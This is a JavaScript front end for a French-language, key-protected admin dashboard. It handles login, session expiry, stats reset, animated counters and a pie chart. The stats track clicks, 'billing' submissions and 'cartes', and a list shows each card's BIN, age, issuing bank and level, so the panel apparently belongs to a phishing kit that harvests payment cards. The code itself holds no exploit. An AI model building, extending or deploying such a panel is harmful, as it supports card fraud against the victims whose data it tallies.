const PANEL_API = "../api/panel";

function panelFetch(url, options = {}) {
  return fetch(PANEL_API + url, {
    credentials: "same-origin",
    headers: { "Content-Type": "application/json", ...(options.headers || {}) },
    ...options,
  }).then(async (res) => {
    const data = await res.json().catch(() => ({}));
    return { res, data };
  });
}

async function panelCheckSession() {
  const { res, data } = await panelFetch("/session.php");
  return res.ok && data.ok && data.authenticated === true;
}

function panelInitSessionExpiry() {
  panelFetch("/session.php").then(({ data }) => {
    if (!data.expires_at) return;

    const remainingMs = data.expires_at * 1000 - Date.now();
    if (remainingMs <= 0) {
      window.location.replace("index.php");
      return;
    }

    setTimeout(() => window.location.replace("index.php"), remainingMs);
  });

  setInterval(async () => {
    if (!(await panelCheckSession())) {
      window.location.replace("index.php");
    }
  }, 60000);
}

async function panelGuardDashboard() {
  const authed = await panelCheckSession();
  if (!authed) {
    window.location.replace("index.php");
    return false;
  }
  return true;
}

async function panelFetchStats() {
  const { res, data } = await panelFetch("/stats.php");
  if (!res.ok || !data.ok) {
    throw new Error("stats_unavailable");
  }
  return data.stats;
}

function panelInitLogin(form) {
  const input = form.querySelector("#panel-key");
  const error = form.querySelector(".panel-error");
  const submitBtn = form.querySelector('button[type="submit"]');

  function updateBtn() {
    if (submitBtn) {
      submitBtn.disabled = !input.value.trim();
    }
  }

  function showError(msg) {
    if (!error) return;
    error.textContent = msg;
    error.classList.add("is-visible");
  }

  input.addEventListener("input", () => {
    error?.classList.remove("is-visible");
    updateBtn();
  });
  updateBtn();

  form.addEventListener("submit", async (e) => {
    e.preventDefault();
    const password = input.value.trim();
    if (!password) return;

    if (submitBtn) submitBtn.disabled = true;

    const { res, data } = await panelFetch("/login.php", {
      method: "POST",
      body: JSON.stringify({ password }),
    });

    if (submitBtn) submitBtn.disabled = false;

    if (res.ok && data.ok) {
      window.location.href = "dashboard.php";
      return;
    }

    showError("Clé invalide.");
  });
}

function panelInitLogout(btn) {
  if (!btn) return;
  btn.addEventListener("click", async () => {
    await panelFetch("/logout.php", { method: "POST" });
    window.location.href = "index.php";
  });
}

function panelInitReset(btn) {
  if (!btn) return;
  btn.addEventListener("click", async () => {
    if (
      !confirm(
        "Réinitialiser toutes les statistiques ? Cette action est irréversible."
      )
    ) {
      return;
    }

    btn.disabled = true;

    const { res, data } = await panelFetch("/reset.php", { method: "POST" });

    if (res.ok && data.ok) {
      window.location.reload();
      return;
    }

    btn.disabled = false;
    alert("Impossible de réinitialiser les statistiques.");
  });
}

function panelEaseOut(t) {
  return 1 - Math.pow(1 - t, 3);
}

function panelAnimateCount(el, target, duration = 900) {
  const start = performance.now();
  function tick(now) {
    const p = Math.min((now - start) / duration, 1);
    el.textContent = String(Math.round(target * panelEaseOut(p)));
    if (p < 1) requestAnimationFrame(tick);
  }
  requestAnimationFrame(tick);
}

function panelAnimatePct(el, target, duration = 1000) {
  const start = performance.now();
  function tick(now) {
    const p = Math.min((now - start) / duration, 1);
    const val = target * panelEaseOut(p);
    el.textContent = val.toFixed(1).replace(".", ",") + " %";
    if (p < 1) requestAnimationFrame(tick);
  }
  requestAnimationFrame(tick);
}

function panelInitHoverCards(root) {
  const cards = root.querySelectorAll(".panel-card-interactive, .panel-kpi");
  cards.forEach((card) => {
    const accent = card.dataset.accent;
    if (accent) card.style.setProperty("--accent", accent);

    card.addEventListener("mousemove", (e) => {
      const rect = card.getBoundingClientRect();
      const x = ((e.clientX - rect.left) / rect.width) * 100;
      const y = ((e.clientY - rect.top) / rect.height) * 100;
      card.style.setProperty("--mx", x + "%");
      card.style.setProperty("--my", y + "%");
    });
    card.addEventListener("mouseleave", () => {
      card.style.setProperty("--mx", "50%");
      card.style.setProperty("--my", "50%");
    });
  });
}

function panelInitDashboard(root, stats) {
  if (!root || !stats) return;

  panelInitHoverCards(root);

  root.querySelectorAll("[data-stat]").forEach((el, i) => {
    const key = el.dataset.stat;
    const target = Number(stats[key]);
    if (!Number.isFinite(target)) return;
    el.dataset.count = String(target);
    setTimeout(() => panelAnimateCount(el, target, 850 + i * 120), 180 + i * 100);
  });

  const conv = stats.conversion || {};
  root.querySelectorAll(".panel-bar__fill[data-conv]").forEach((fill, i) => {
    const w = Number(conv[fill.dataset.conv]);
    if (!Number.isFinite(w)) return;
    fill.dataset.width = String(w);
    setTimeout(() => {
      fill.style.width = w + "%";
    }, 400 + i * 150);
  });

  root.querySelectorAll(".panel-bar__pct[data-conv]").forEach((el, i) => {
    const target = Number(conv[el.dataset.conv]);
    if (!Number.isFinite(target)) return;
    el.dataset.pct = String(target);
    setTimeout(() => panelAnimatePct(el, target, 1000 + i * 100), 450 + i * 150);
  });

  root.querySelectorAll(".panel-stagger").forEach((group) => {
    group.classList.add("is-visible");
  });

  requestAnimationFrame(() => root.classList.add("is-ready"));
}

function panelRenderStats(stats) {
  const pie = stats.pie || {};
  const conv = stats.conversion || {};

  document.querySelectorAll("[data-cards-count]").forEach((el) => {
    el.textContent = String(stats.cartes ?? 0);
  });

  const uniqueEl = document.querySelector("[data-unique-today]");
  if (uniqueEl) uniqueEl.textContent = String(stats.unique_today ?? 0);

  const lastCardEl = document.querySelector("[data-last-card]");
  if (lastCardEl) lastCardEl.textContent = stats.last_card_at || "—";

  document.querySelectorAll(".panel-legend__value").forEach((el) => {
    const seg = el.closest("[data-segment]")?.dataset.segment;
    if (seg === "cartes") el.textContent = String(pie.cartes ?? 0);
    if (seg === "billing") el.textContent = String(pie.billing ?? 0);
    if (seg === "clics") el.textContent = String(pie.clics ?? 0);
  });

  const list = document.getElementById("panel-cards-list");
  if (list) {
    list.innerHTML = "";
    const cards = stats.cards || [];
    if (cards.length === 0) {
      list.innerHTML =
        '<li class="panel-card-row panel-card-row--empty"><span>Aucune carte pour le moment</span></li>';
    } else {
      cards.forEach((card) => {
        const li = document.createElement("li");
        li.className = "panel-card-row panel-card-row--interactive";
        const levelClass = card.level_class ? ` ${card.level_class}` : "";
        li.innerHTML =
          `<span class="panel-card-row__bin">${panelEscapeHtml(card.bin)}</span>` +
          `<span class="panel-card-row__age">${panelEscapeHtml(card.age)}</span>` +
          `<span class="panel-card-row__bank">${panelEscapeHtml(card.bank)}</span>` +
          `<span class="panel-card-row__level${levelClass}">${panelEscapeHtml(card.level)}</span>`;
        list.appendChild(li);
      });
    }
  }

  window.__panelPieSegments = {
    cartes: { value: pie.cartes || 0, color: "#00e676", label: "Cartes" },
    billing: { value: pie.billing || 0, color: "#ffb300", label: "Billing" },
    clics: { value: pie.clics || 0, color: "#5c5c5c", label: "Clics seuls" },
  };

  return { conv, pie };
}

function panelEscapeHtml(str) {
  return String(str)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;");
}

function panelPieArc(cx, cy, r, startDeg, endDeg) {
  const start = ((startDeg - 90) * Math.PI) / 180;
  const end = ((endDeg - 90) * Math.PI) / 180;
  const x1 = cx + r * Math.cos(start);
  const y1 = cy + r * Math.sin(start);
  const x2 = cx + r * Math.cos(end);
  const y2 = cy + r * Math.sin(end);
  const large = endDeg - startDeg > 180 ? 1 : 0;
  return `M ${cx} ${cy} L ${x1} ${y1} A ${r} ${r} 0 ${large} 1 ${x2} ${y2} Z`;
}

function panelInitPieChart(wrap, segments) {
  if (!wrap) return;

  const svg = wrap.querySelector(".panel-pie-svg");
  if (!svg) return;

  svg.innerHTML = "";

  const tooltip = document.getElementById("panel-pie-tooltip");
  const centerTotal = document.getElementById("panel-pie-total");
  const centerLabel = document.getElementById("panel-pie-center-label");
  const legend = document.getElementById("panel-pie-legend");
  const cx = 110;
  const cy = 110;
  const r = 88;
  const gap = 1.2;

  const entries = Object.entries(segments).filter(([, s]) => s.value > 0);
  const total = Math.max(
    entries.reduce((sum, [, s]) => sum + s.value, 0),
    Number(segments.cartes?.value || 0) +
      Number(segments.billing?.value || 0) +
      Number(segments.clics?.value || 0)
  );

  if (centerTotal) centerTotal.textContent = String(total || 0);

  if (total === 0 || entries.length === 0) {
    const ring = document.createElementNS("http://www.w3.org/2000/svg", "circle");
    ring.setAttribute("cx", String(cx));
    ring.setAttribute("cy", String(cy));
    ring.setAttribute("r", String(r));
    ring.setAttribute("fill", "#3a3a3a");
    svg.appendChild(ring);
    return;
  }

  let angle = 0;
  const sliceEls = [];

  entries.forEach(([key, seg]) => {
    const sweep = (seg.value / total) * 360;
    if (sweep <= 0) return;

    const start = angle + gap / 2;
    const end = angle + sweep - gap / 2;
    angle += sweep;

    const path = document.createElementNS("http://www.w3.org/2000/svg", "path");
    path.setAttribute("d", panelPieArc(cx, cy, r, start, end));
    path.setAttribute("fill", seg.color);
    path.style.color = seg.color;
    path.setAttribute("class", "panel-pie-slice");
    path.setAttribute("data-key", key);
    path.setAttribute("tabindex", "0");

    const pct = ((seg.value / total) * 100).toFixed(1).replace(".", ",");

    function showInfo() {
      wrap.classList.add("is-hovered");
      path.classList.add("is-active");
      legend?.querySelectorAll("li").forEach((li) => {
        li.classList.toggle("is-active", li.dataset.segment === key);
      });
      if (tooltip) {
        tooltip.hidden = false;
        tooltip.innerHTML =
          `<strong>${seg.label}</strong>` +
          `<span>${seg.value} · ${pct} %</span>` +
          `<span class="panel-pie-tooltip__hint">du total des clics</span>`;
        tooltip.style.borderColor = seg.color;
      }
      if (centerTotal) centerTotal.textContent = String(seg.value);
      if (centerLabel) centerLabel.textContent = seg.label.toLowerCase();
    }

    function hideInfo() {
      wrap.classList.remove("is-hovered");
      path.classList.remove("is-active");
      legend?.querySelectorAll("li").forEach((li) => li.classList.remove("is-active"));
      if (tooltip) tooltip.hidden = true;
      if (centerTotal) centerTotal.textContent = String(total);
      if (centerLabel) centerLabel.textContent = "clics";
    }

    path.addEventListener("mouseenter", showInfo);
    path.addEventListener("mouseleave", hideInfo);
    path.addEventListener("focus", showInfo);
    path.addEventListener("blur", hideInfo);

    const legendItem = legend?.querySelector(`[data-segment="${key}"]`);
    if (legendItem) {
      legendItem.addEventListener("mouseenter", showInfo);
      legendItem.addEventListener("mouseleave", hideInfo);
    }

    svg.appendChild(path);
    sliceEls.push({ path, hideInfo });
  });

  wrap.addEventListener("mouseleave", () => {
    sliceEls.forEach(({ path, hideInfo }) => {
      if (!path.matches(":hover")) hideInfo();
    });
  });
}

async function panelBootDashboard() {
  const root = document.getElementById("panel-dashboard");
  const authed = await panelGuardDashboard();
  if (!authed) return;

  panelInitLogout(document.getElementById("panel-logout"));
  panelInitLogout(document.getElementById("panel-logout-mobile"));
  panelInitReset(document.getElementById("panel-reset"));
  panelInitSessionExpiry();

  try {
    const stats = await panelFetchStats();
    panelRenderStats(stats);
    panelInitDashboard(root, stats);
    panelInitPieChart(
      document.getElementById("panel-pie-wrap"),
      window.__panelPieSegments || {
        cartes: { value: 0, color: "#00e676", label: "Cartes" },
        billing: { value: 0, color: "#ffb300", label: "Billing" },
        clics: { value: 0, color: "#5c5c5c", label: "Clics seuls" },
      }
    );
  } catch {
    window.location.replace("index.php");
  }
}
